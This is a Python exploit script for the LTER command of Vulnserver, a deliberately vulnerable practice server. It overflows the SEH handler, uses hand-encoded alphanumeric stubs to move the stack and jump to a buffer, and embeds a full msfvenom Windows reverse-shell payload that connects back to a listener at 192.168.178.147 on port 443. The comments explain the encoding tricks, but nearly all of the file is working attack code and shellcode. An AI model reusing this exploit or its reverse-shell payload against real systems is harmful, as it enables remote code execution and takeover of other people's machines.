#########################################################################################
# Title: Vulnserver LTER SEH exploit
# This is an interesting one, since you are only restricted to alpha-numeric (well almost.. 0x01-0x7f)
# To get Stephen Bradshaw's Vulnserver, visit: http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
#########################################################################################

#!/usr/bin/python
import socket
server = '[Remote IP]'
sport = 9999

#length = int(raw_input('Length of attack: '))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)

ret = "\x5E\x19\x50\x62"  # Pop pop ret address in essfunc.dll, avoid bad char

# Move ESP by 0x301 54 58 2D 66 4D 55 55 2D 66 4D 55 55 2D 33 62 55 55 50 5C 90
# JMP EAX 25 4A 4D 4E 55 25 35 32 31 2A 2D 66 4D 55 55 2D 66 4D 55 55 2D 53 65 54 55 50

# Explanation - 
# After the short jump \x71\xFF , we gain a max of 126 bytes. We need to move more "up" the stack to reach our shellcode.
# Lets custom encode the following instructions to reach it.  
# Eg - We want ESP here - 0189FFAD but ESP is at - 0189ECA4 . So ADD 0x1309 . Since ASLR is enabled, the higher bytes will be different each time.   
# Now we are the bottom of the buffer. We want to jump up ~0x738(1848 bytes) bytes - Just to keep the stack happy. 
# Now we can jump to address pointed to by EBX

encode_bj1 = "\x54\x58" #PUSH ESP, POP EAX
encode_bj1 += "\x66\x05\x09\x13" # ADD AX, 1309.
encode_bj1 += "\x50\x5C" # PUSH EAX, POP ESP
encode_bj1 += "\x66\x2D\x2C\x07" #SUB AX, 72C
encode_bj1 += "\x50\x5B" #PUSH EAX, POP EBX
encode_bj1 += "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A" # Zero out EAX
encode_bj1 += "\x2D\x66\x4D\x55\x55\x2D\x77\x4F\x55\x55\x2D\x24\x7F\x54\x55"  #Write "JMP EBX"  by subtracting hex bytes. i.e. "FF e3" i.e. E3FF in Little endian.
 
encode_bj1 += "\x4C\x4C\x4C\x4C\x66\x50\x44\x44\x44\x44\x44\x44\x44\x44\x44" # Some DEC ESP to align the stack and then    
encode_bj1 += "\x54\x58\x66\x2D\x09\x13\x50\x5C\x44" #SUB ESP, 1309, so PUSH ESP, POP EAX, SUB AX, 1309, PUSH EAX, POP ESP . ADD BX, 8


#msfvenom -p windows/shell_reverse_tcp lhost=192.168.178.147 lport=443 BufferRegister=EBX -e x86/alpha_mixed EXITFUNC=seh -f py
buf =  ""
buf += "\x53\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += "\x4b\x4c\x58\x68\x4f\x72\x75\x50\x73\x30\x53\x30\x71"
buf += "\x70\x4c\x49\x58\x65\x46\x51\x49\x50\x71\x74\x6e\x6b"
buf += "\x42\x70\x66\x50\x4c\x4b\x66\x32\x74\x4c\x4e\x6b\x73"
buf += "\x62\x66\x74\x4e\x6b\x33\x42\x31\x38\x44\x4f\x38\x37"
buf += "\x63\x7a\x56\x46\x70\x31\x39\x6f\x6c\x6c\x65\x6c\x50"
buf += "\x61\x53\x4c\x54\x42\x66\x4c\x35\x70\x49\x51\x48\x4f"
buf += "\x56\x6d\x65\x51\x38\x47\x4a\x42\x58\x72\x52\x72\x52"
buf += "\x77\x6e\x6b\x76\x32\x32\x30\x4e\x6b\x31\x5a\x75\x6c"
buf += "\x6e\x6b\x72\x6c\x42\x31\x30\x78\x4b\x53\x67\x38\x55"
buf += "\x51\x7a\x71\x53\x61\x4c\x4b\x46\x39\x35\x70\x75\x51"
buf += "\x39\x43\x6c\x4b\x67\x39\x35\x48\x59\x73\x47\x4a\x50"
buf += "\x49\x4c\x4b\x64\x74\x4e\x6b\x43\x31\x4b\x66\x34\x71"
buf += "\x49\x6f\x4c\x6c\x59\x51\x78\x4f\x76\x6d\x76\x61\x69"
buf += "\x57\x54\x78\x6b\x50\x64\x35\x6c\x36\x47\x73\x61\x6d"
buf += "\x59\x68\x57\x4b\x31\x6d\x46\x44\x54\x35\x68\x64\x30"
buf += "\x58\x6c\x4b\x71\x48\x65\x74\x35\x51\x7a\x73\x70\x66"
buf += "\x6e\x6b\x44\x4c\x42\x6b\x4e\x6b\x53\x68\x65\x4c\x65"
buf += "\x51\x58\x53\x4c\x4b\x77\x74\x6e\x6b\x33\x31\x48\x50"
buf += "\x4c\x49\x57\x34\x65\x74\x34\x64\x63\x6b\x51\x4b\x45"
buf += "\x31\x50\x59\x42\x7a\x53\x61\x49\x6f\x6b\x50\x43\x6f"
buf += "\x63\x6f\x51\x4a\x6e\x6b\x35\x42\x5a\x4b\x6c\x4d\x63"
buf += "\x6d\x30\x68\x55\x63\x50\x32\x37\x70\x47\x70\x73\x58"
buf += "\x52\x57\x73\x43\x45\x62\x71\x4f\x33\x64\x35\x38\x52"
buf += "\x6c\x64\x37\x56\x46\x46\x67\x39\x6f\x49\x45\x6d\x68"
buf += "\x6c\x50\x75\x51\x63\x30\x35\x50\x57\x59\x78\x44\x30"
buf += "\x54\x62\x70\x55\x38\x55\x79\x4b\x30\x72\x4b\x43\x30"
buf += "\x59\x6f\x49\x45\x42\x70\x32\x70\x46\x30\x46\x30\x51"
buf += "\x50\x62\x70\x33\x70\x72\x70\x63\x58\x49\x7a\x76\x6f"
buf += "\x39\x4f\x59\x70\x6b\x4f\x7a\x75\x6d\x47\x53\x5a\x76"
buf += "\x65\x42\x48\x69\x50\x59\x38\x6c\x72\x6c\x53\x30\x68"
buf += "\x53\x32\x55\x50\x56\x61\x6f\x4b\x4c\x49\x68\x66\x72"
buf += "\x4a\x72\x30\x70\x56\x52\x77\x33\x58\x4d\x49\x4d\x75"
buf += "\x44\x34\x33\x51\x79\x6f\x78\x55\x4d\x55\x69\x50\x34"
buf += "\x34\x76\x6c\x4b\x4f\x30\x4e\x77\x78\x33\x45\x5a\x4c"
buf += "\x52\x48\x4a\x50\x4d\x65\x59\x32\x30\x56\x69\x6f\x38"
buf += "\x55\x73\x58\x52\x43\x50\x6d\x51\x74\x75\x50\x4c\x49"
buf += "\x58\x63\x43\x67\x63\x67\x76\x37\x30\x31\x48\x76\x31"
buf += "\x7a\x55\x42\x72\x79\x31\x46\x5a\x42\x4b\x4d\x61\x76"
buf += "\x58\x47\x61\x54\x46\x44\x75\x6c\x53\x31\x35\x51\x4e"
buf += "\x6d\x30\x44\x56\x44\x52\x30\x48\x46\x75\x50\x57\x34"
buf += "\x63\x64\x46\x30\x56\x36\x30\x56\x62\x76\x53\x76\x42"
buf += "\x76\x32\x6e\x62\x76\x73\x66\x73\x63\x36\x36\x72\x48"
buf += "\x44\x39\x5a\x6c\x65\x6f\x6e\x66\x79\x6f\x58\x55\x4e"
buf += "\x69\x6d\x30\x50\x4e\x53\x66\x50\x46\x49\x6f\x76\x50"
buf += "\x53\x58\x43\x38\x6b\x37\x35\x4d\x45\x30\x69\x6f\x48"
buf += "\x55\x6d\x6b\x6b\x4e\x74\x4e\x47\x42\x7a\x4a\x45\x38"
buf += "\x4c\x66\x6d\x45\x6d\x6d\x4d\x4d\x49\x6f\x48\x55\x45"
buf += "\x6c\x44\x46\x63\x4c\x77\x7a\x6f\x70\x49\x6b\x4b\x50"
buf += "\x52\x55\x76\x65\x4f\x4b\x61\x57\x77\x63\x33\x42\x32"
buf += "\x4f\x71\x7a\x45\x50\x62\x73\x4b\x4f\x49\x45\x41\x41"


attack = "A" * 1687 + buf + "A" * (3498 + 3 - len(encode_bj1)-50 - 1688 - len(buf)) + "A" * 11 + encode_bj1 +"C" * 57 + "\x71\xFF\x90\x90" + ret + "C" * 1500

s.send(('LTER .' + attack + '\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
